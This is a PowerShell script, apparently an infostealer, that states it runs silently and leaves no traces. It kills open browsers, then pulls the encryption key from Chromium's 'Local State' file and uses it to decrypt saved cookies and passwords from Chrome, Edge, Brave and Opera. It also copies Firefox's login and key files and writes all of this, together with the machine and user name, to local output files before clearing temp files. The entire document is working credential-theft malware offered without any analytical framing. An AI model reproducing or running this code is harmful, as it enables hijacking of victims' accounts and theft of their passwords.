# stealth_extract.ps1
# Runs silently - no console, no windows, no traces

$OutputDir = Join-Path (Split-Path $PSCommandPath -Parent) "output"
if (-not (Test-Path $OutputDir)) { New-Item -ItemType Directory -Path $OutputDir -Force | Out-Null }

# Kill browsers silently to unlock DBs
Get-Process chrome, msedge, firefox, opera, brave -ErrorAction SilentlyContinue | Stop-Process -Force

# Load assemblies silently
Add-Type -AssemblyName System.Security -ErrorAction SilentlyContinue
Add-Type -AssemblyName System.Data -ErrorAction SilentlyContinue

# Try SQLite
$sqliteLoaded = $false
try {
    Add-Type -AssemblyName System.Data.SQLite -ErrorAction Stop
    $sqliteLoaded = $true
} catch {
    try {
        $dllPath = Join-Path (Split-Path $PSCommandPath -Parent) "System.Data.SQLite.dll"
        if (Test-Path $dllPath) { Add-Type -Path $dllPath -ErrorAction Stop; $sqliteLoaded = $true }
    } catch {}
}

function Decrypt-Value {
    param([byte[]]$Data, [byte[]]$Key)
    if ($Data.Length -le 3) { return $null }
    if ($Data[0] -eq 0x76 -and $Data[1] -eq 0x31 -and $Data[2] -eq 0x30) {
        try { $n=$Data[3..14]; $c=$Data[15..($Data.Length-17)]; $t=$Data[($Data.Length-16)..($Data.Length-1)]
            $a=[System.Security.Cryptography.AesGcm]::new($Key,16); $p=[byte[]]::new($c.Length)
            $a.Decrypt($n,$c,$t,$p); return [Text.Encoding]::UTF8.GetString($p) } catch { return $null }
    }
    try { return [Text.Encoding]::UTF8.GetString([Security.Cryptography.ProtectedData]::Unprotect($Data,$null,[Security.Cryptography.DataProtectionScope]::CurrentUser))
    } catch { return $null }
}

function Get-MasterKey {
    param($Path)
    $f = Join-Path $Path "Local State"
    if (-not (Test-Path $f)) { return $null }
    try { $s = Get-Content $f -Raw -ErrorAction Stop | ConvertFrom-Json
        $k = $s.os_crypt.encrypted_key; if (-not $k) { return $null }
        $b = [Convert]::FromBase64String($k)
        return [Security.Cryptography.ProtectedData]::Unprotect($b[5..($b.Length-1)],$null,[Security.Cryptography.DataProtectionScope]::CurrentUser)
    } catch { return $null }
}

$cookies = @(); $passwords = @()

# Chromium browsers
$browsers = @(
    @("Chrome","$env:LOCALAPPDATA\Google\Chrome\User Data"),
    @("Edge","$env:LOCALAPPDATA\Microsoft\Edge\User Data"),
    @("Brave","$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"),
    @("Opera","$env:APPDATA\Opera Software\Opera Stable")
)

foreach ($b in $browsers) {
    $name = $b[0]; $root = $b[1]
    if (-not (Test-Path $root)) { continue }
    $mk = Get-MasterKey $root; if (-not $mk) { continue }
    $dirs = Get-ChildItem $root -Directory | Where-Object { $_.Name -match '^(Default|Profile \d+)$' }
    foreach ($prof in $dirs) {
        # Cookies
        $cf = Join-Path $prof.FullName "Network\Cookies"
        if (Test-Path $cf) {
            if ($sqliteLoaded) {
                try { $tmp = [IO.Path]::GetTempFileName(); Copy-Item $cf $tmp -Force
                    $c = New-Object Data.SQLite.SQLiteConnection("Data Source=$tmp;Read Only=True;")
                    $c.Open(); $cmd = $c.CreateCommand(); $cmd.CommandText = "SELECT host_key,name,path,encrypted_value FROM cookies"
                    $r = $cmd.ExecuteReader()
                    while ($r.Read()) { $v = [byte[]]$r["encrypted_value"]; if ($v.Length -gt 0) { $d = Decrypt-Value $v $mk; if ($d) { $cookies += [PSCustomObject]@{B=$name;H=$r["host_key"];N=$r["name"];V=$d} } } }
                    $r.Close(); $c.Close(); Remove-Item $tmp -Force -ErrorAction SilentlyContinue
                } catch {}
            } else { Copy-Item $cf (Join-Path $OutputDir "cookies_${name}_$($prof.Name).db") -Force }
        }
        # Passwords
        $lf = Join-Path $prof.FullName "Login Data"
        if (Test-Path $lf) {
            if ($sqliteLoaded) {
                try { $tmp = [IO.Path]::GetTempFileName(); Copy-Item $lf $tmp -Force
                    $c = New-Object Data.SQLite.SQLiteConnection("Data Source=$tmp;Read Only=True;")
                    $c.Open(); $cmd = $c.CreateCommand(); $cmd.CommandText = "SELECT origin_url,username_value,password_value FROM logins"
                    $r = $cmd.ExecuteReader()
                    while ($r.Read()) { $u=$r["username_value"]; if ([string]::IsNullOrEmpty($u)) { continue }
                        $ep=[byte[]]$r["password_value"]; if ($ep.Length -eq 0) { continue }
                        if ($ep.Length -ge 3 -and $ep[0] -eq 0x76 -and $ep[1] -eq 0x31 -and $ep[2] -eq 0x31) {
                            $passwords += [PSCustomObject]@{B=$name;U=$r["origin_url"];N=$u;P="[APP-BOUND]"}
                        } else { $d=Decrypt-Value $ep $mk; if ($d) { $passwords += [PSCustomObject]@{B=$name;U=$r["origin_url"];N=$u;P=$d} } }
                    }
                    $r.Close(); $c.Close(); Remove-Item $tmp -Force -ErrorAction SilentlyContinue
                } catch {}
            } else { Copy-Item $lf (Join-Path $OutputDir "logins_${name}_$($prof.Name).db") -Force }
        }
    }
}

# Firefox
$ff = "$env:APPDATA\Mozilla\Firefox\Profiles"
if (Test-Path $ff) {
    $fds = Get-ChildItem $ff -Directory | Where-Object { $_.Name -match '\.default' }
    foreach ($fd in $fds) {
        $cdf = Join-Path $fd.FullName "cookies.sqlite"
        if (Test-Path $cdf) {
            if ($sqliteLoaded) {
                try { $tmp = [IO.Path]::GetTempFileName(); Copy-Item $cdf $tmp -Force
                    $c = New-Object Data.SQLite.SQLiteConnection("Data Source=$tmp;Read Only=True;")
                    $c.Open(); $cmd=$c.CreateCommand(); $cmd.CommandText="SELECT host,name,path,value FROM moz_cookies"
                    $r=$cmd.ExecuteReader()
                    while ($r.Read()) { $cookies += [PSCustomObject]@{B="Firefox";H=$r["host"];N=$r["name"];V=$r["value"]} }
                    $r.Close(); $c.Close(); Remove-Item $tmp -Force -ErrorAction SilentlyContinue
                } catch {}
            } else { Copy-Item $cdf (Join-Path $OutputDir "ff_cookies_$($fd.Name).sqlite") -Force }
        }
        $lj = Join-Path $fd.FullName "logins.json"; $k4 = Join-Path $fd.FullName "key4.db"
        if (Test-Path $lj -and (Test-Path $k4)) { Copy-Item $lj (Join-Path $OutputDir "ff_logins_$($fd.Name).json") -Force; Copy-Item $k4 (Join-Path $OutputDir "ff_key4_$($fd.Name).db") -Force }
    }
}

# Export
if ($cookies.Count -gt 0) {
    $cookies | Export-Csv -Path (Join-Path $OutputDir "cookies.csv") -NoTypeInformation
    $cookies | ForEach-Object { "$($_.B) | $($_.H) | $($_.N) = $($_.V)" } | Out-File (Join-Path $OutputDir "cookies.txt") -Encoding ASCII
}
if ($passwords.Count -gt 0) {
    $passwords | Export-Csv -Path (Join-Path $OutputDir "passwords.csv") -NoTypeInformation
    $passwords | ForEach-Object { "$($_.B) | $($_.U) | $($_.N) : $($_.P)" } | Out-File (Join-Path $OutputDir "passwords.txt") -Encoding ASCII
}

# System info
"Computer: $env:COMPUTERNAME", "User: $env:USERNAME", "Date: $(Get-Date)", "SQLite: $sqliteLoaded" | Out-File (Join-Path $OutputDir "info.txt") -Encoding ASCII

# Clean temp
Get-ChildItem "$env:TEMP" -Filter "tmp*.tmp" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue